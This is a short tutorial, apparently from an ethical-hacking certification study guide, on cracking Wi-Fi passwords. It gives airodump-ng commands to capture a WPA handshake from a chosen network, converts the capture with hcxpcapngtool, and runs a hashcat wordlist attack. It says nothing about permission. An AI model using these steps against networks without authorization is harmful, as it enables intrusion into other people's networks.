# Hacking Wireless Network
Here we will learn how to hack a wifi completely.  WiFi hack means hacking WiFi password.

## First of all, a tool named wifite should be properly installed in our system.

Wi-Fi cracking with: 
hashcat
airmon-ng


# Hashcat

Install this tool: hcxpcapngtool , wifite, Hashcat.

Now we need to capture a handshake file. 

command: airodump-ng --bssid 38:6B:1C:81:55:32 -c 11 -w HS_NETCON wlan2

```
airodump-ng --bssid <wifi mac> -c <channel number> -w <file name> wlan <interface address>
```

You can use Stryker Or WPS App Pro to GUI easily find any Wi-Fi network BSSID or Mac address and channel number.

otherwise you can use terminal to do that like this: 

```
airodump-ng wlan0
```
wlan2 → You must use your Wi-Fi card interface name.

![Screenshot_2023-12-09-20-17-01-915_com offsec nhterm](https://github.com/masshuvo/full_ceh_guide/assets/108648096/1973c9d5-2405-479c-898a-00d123f4376a)

Capture Handshake:

First, you need to capture a 4-way handshake using tools like airodump-ng, Wireshark, or similar tools.
Save Handshake Capture:

Save the captured handshake in a file, for example, handshake.cap.
Use hcxpcapngtool:

Run the following command to convert the captured handshake to the hashcat-compatible format:

Coode: hcxpcapngtool -o output.hccapx handshake.cap
```
hcxpcapngtool -o output.hccapx handshake.cap
```
handshake.cap → This is the one you captured

output.hccapx → The name you want to save it as, but last extension should be like this *.hccapx

![Screenshot_2023-12-09-20-21-09-632_com offsec nhterm](https://github.com/masshuvo/full_ceh_guide/assets/108648096/73003c32-5b2b-42b5-9abb-afc6631be013)


after convert this file you will see like this: 

![Screenshot_2023-12-09-20-21-56-603_com offsec nhterm](https://github.com/masshuvo/full_ceh_guide/assets/108648096/4ce7ded8-360b-4b41-b313-53b3305f9d5a)

Now you can execute this command for cracking: hashcat -m 22000 output.hccapx /usr/share/dict/wordlist-probable.txt

```
hashcat -m 22000 <handshake file>.hccapx <your wordlist>.txt
```

### You can use here password word list as you like. just add the path correctly. 

![Screenshot_2023-12-09-20-24-58-047_com offsec nhterm](https://github.com/masshuvo/full_ceh_guide/assets/108648096/7f57b06b-40b7-4b4a-8cb8-67ae454f62a2)

